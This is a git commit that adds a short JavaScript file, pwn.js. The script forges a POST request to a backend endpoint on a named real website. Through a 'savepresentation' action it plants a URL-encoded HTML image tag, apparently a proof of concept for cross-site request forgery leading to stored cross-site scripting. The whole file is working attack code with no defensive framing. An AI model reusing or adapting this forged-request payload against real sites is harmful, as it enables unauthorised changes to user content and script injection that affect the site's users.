af0840a4fa1504c2030dde8f0e7e4a896991c31d
Renwa <renwax23@gmail.com>
2019-01-13 21:44:56 +0300

    Create pwn.js

---
+++ pwn.js
@@ -0,0 +1,4 @@
+var xhttp = new XMLHttpRequest();
+xhttp.open("POST", "https://1x.com/backend/run.php", true);
+xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhttp.send("action=savepresentation&id=&text=%3c%69%6d%67%20%73%72%63%3d%78%73%73%3e&button=savepresentationbutton");
